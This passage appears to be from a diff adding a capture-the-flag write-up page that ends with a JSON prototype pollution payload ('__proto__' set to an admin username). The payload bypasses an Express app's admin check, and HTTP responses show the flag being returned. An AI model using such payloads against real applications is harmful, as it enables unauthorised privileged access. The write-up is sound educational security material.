+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;user&#34;</span>, <span style="color:#e6db74">&#34;password&#34;</span>:<span style="color:#e6db74">&#34;pass&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>HTTP/1.1 <span style="color:#ae81ff">400</span> Bad Request
+</span></span><span style="display:flex;"><span>X-Powered-By: Express
+</span></span><span style="display:flex;"><span>Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">15</span>
+</span></span><span style="display:flex;"><span>ETag: W/<span style="color:#e6db74">&#34;f-LFwyFqF3QJD0ZTsW0jjhOWtuCks&#34;</span>
+</span></span><span style="display:flex;"><span>Date: Mon, <span style="color:#ae81ff">02</span> Oct <span style="color:#ae81ff">2023</span> 20:53:19 GMT
+</span></span><span style="display:flex;"><span>Connection: close
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ADMIN REQUIRED.
+</span></span></code></pre></div><p>As expected, we need to be an admin to read the content of that page. What we want to do now is bypass the &ldquo;username != admin&rdquo; check, otherwise, we can&rsquo;t really do much.</p>
+<p>Looking at the <code>user_route.js</code> code, we notice that there&rsquo;s no check on the type of data we pass through the request body. Thus, performing a prototype pollution attack via JSON might be the solution.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;__proto__&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;admin&#34;</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#f92672">&#34;password&#34;</span>:<span style="color:#e6db74">&#34;password&#34;</span>
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>If then we send a post request with this body we manage to fool the check function, we log in by using a standard body as we already have done before and we manage to get the /joi resource and retrieve the flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>X-Powered-By: Express
+</span></span><span style="display:flex;"><span>Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">379</span>
+</span></span><span style="display:flex;"><span>ETag: W/<span style="color:#e6db74">&#34;17b-h9mCq+eUI61eENP2iOtXXI/GONs&#34;</span>
+</span></span><span style="display:flex;"><span>Date: Mon, <span style="color:#ae81ff">02</span> Oct <span style="color:#ae81ff">2023</span> 21:12:55 GMT
+</span></span><span style="display:flex;"><span>Connection: close
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;!DOCTYPE html&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;head&gt;
+</span></span><span style="display:flex;"><span>    &lt;link href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/css/main.css&#34;</span> rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span>/&gt;
+</span></span><span style="display:flex;"><span>&lt;/head&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;body&gt;
+</span></span><span style="display:flex;"><span>    &lt;div class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;container&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;div class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stack&#34;</span> style<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;--stacks: 3;&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>          &lt;span style<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;--index: 0;&#34;</span>&gt;maple<span style="color:#f92672">{</span>FLAG<span style="color:#f92672">}</span>&lt;/span&gt;
+</span></span><span style="display:flex;"><span>          &lt;span style<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;--index: 1;&#34;</span>&gt;maple<span style="color:#f92672">{</span>FLAG<span style="color:#f92672">}</span>&lt;/span&gt;
+</span></span><span style="display:flex;"><span>          &lt;span style<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;--index: 2;&#34;</span>&gt;maple<span style="color:#f92672">{</span>FLAG<span style="color:#f92672">}</span>&lt;/span&gt;
+</span></span><span style="display:flex;"><span>        &lt;/div&gt;
+</span></span><span style="display:flex;"><span>      &lt;/div&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;/body&gt;
+</span></span><span style="display:flex;"><span>&lt;/html&gt;
+</span></span></code></pre></div>
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.205d491810c28f95aa953fae884e1c27abe13fdf93ec63b882d0036b248d4a6282eb2d134e4e7225c6ad6e86db87b08488a361ca4a7383d01fcff43f3d57b9c3.js" integrity="sha512-IF1JGBDCj5WqlT&#43;uiE4cJ6vhP9&#43;T7GO4gtADaySNSmKC6y0TTk5yJcatbobbh7CEiKNhykpzg9Afz/Q/PVe5ww=="></script>
+
+
+
+    </body>
+</html>
